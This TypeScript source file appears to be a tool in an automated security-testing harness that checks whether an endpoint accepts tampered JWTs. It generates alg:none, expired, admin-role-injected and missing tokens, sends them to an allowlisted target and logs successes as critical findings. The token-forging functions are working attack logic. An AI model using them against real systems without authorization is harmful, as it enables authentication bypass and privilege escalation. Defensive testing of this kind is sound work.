import { request } from 'undici'
import { type JudgeContext, type Finding } from '../types/index.js'
import { assertAllowedUrl } from '../safety/url_guard.js'

export const TEST_JWT_TAMPERING_SCHEMA = {
  type: 'object',
  properties: {
    token: {
      type: 'string',
      description: 'Valid JWT token to tamper with',
    },
    endpoint: {
      type: 'string',
      description: 'Protected endpoint to test against',
    },
  },
  required: ['token', 'endpoint'],
}

function base64UrlDecode(str: string): string {
  const padded = str.replace(/-/g, '+').replace(/_/g, '/') + '=='.slice(0, (4 - str.length % 4) % 4)
  return Buffer.from(padded, 'base64').toString('utf-8')
}

function base64UrlEncode(str: string): string {
  return Buffer.from(str).toString('base64').replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_')
}

function buildNoneAlgToken(originalToken: string): string | null {
  const parts = originalToken.split('.')
  if (parts.length !== 3) return null

  try {
    const header = JSON.parse(base64UrlDecode(parts[0]))
    header.alg = 'none'
    const payload = base64UrlDecode(parts[1])

    return `${base64UrlEncode(JSON.stringify(header))}.${base64UrlEncode(payload)}.`
  } catch {
    return null
  }
}

function buildExpiredToken(originalToken: string): string | null {
  const parts = originalToken.split('.')
  if (parts.length !== 3) return null

  try {
    const payload = JSON.parse(base64UrlDecode(parts[1]))
    payload.exp = Math.floor(Date.now() / 1000) - 3600
    const header = base64UrlDecode(parts[0])

    return `${base64UrlEncode(header)}.${base64UrlEncode(JSON.stringify(payload))}.${parts[2]}`
  } catch {
    return null
  }
}

function buildAdminRoleToken(originalToken: string): string | null {
  const parts = originalToken.split('.')
  if (parts.length !== 3) return null

  try {
    const payload = JSON.parse(base64UrlDecode(parts[1]))
    payload.role = 'admin'
    payload.isAdmin = true
    const header = base64UrlDecode(parts[0])

    return `${base64UrlEncode(header)}.${base64UrlEncode(JSON.stringify(payload))}.${parts[2]}`
  } catch {
    return null
  }
}

export async function testJwtTampering(
  input: { token: string; endpoint: string },
  ctx: JudgeContext
): Promise<string> {
  const url = `${ctx.targetBaseUrl}${input.endpoint}`
  assertAllowedUrl(url, ctx.allowedUrls)

  const findings: Finding[] = []
  const results: string[] = []

  const attacks: Array<{ name: string; token: string | null }> = [
    { name: 'alg:none', token: buildNoneAlgToken(input.token) },
    { name: 'expired token', token: buildExpiredToken(input.token) },
    { name: 'role:admin injection', token: buildAdminRoleToken(input.token) },
    { name: 'no token', token: '' },
  ]

  for (const attack of attacks) {
    if (attack.token === null) continue

    try {
      const headers: Record<string, string> = { 'Content-Type': 'application/json' }
      if (attack.token) headers['Authorization'] = `Bearer ${attack.token}`

      const res = await request(url, { method: 'GET', headers })
      const body = await res.body.text()
      results.push(`[${attack.name}]: ${res.statusCode}`)

      if (res.statusCode >= 200 && res.statusCode < 300) {
        findings.push({
          severity: 'CRITICAL',
          category: 'B',
          description: `JWT tampering succeeded: ${attack.name} — server accepted tampered token`,
          evidence: `curl -X GET '${url}' -H 'Authorization: Bearer ${attack.token?.slice(0, 50)}...'\nResponse (${res.statusCode}): ${body.slice(0, 300)}`,
          isFail: true,
          baseDeduction: 10,
          toolName: 'test_jwt_tampering',
        })
      }
    } catch (err) {
      results.push(`[${attack.name}]: ERROR — ${(err as Error).message}`)
    }
  }

  ctx.findings.push(...findings)
  return `test_jwt_tampering on ${input.endpoint}:\n${results.join('\n')}\nFindings: ${findings.length}`
}
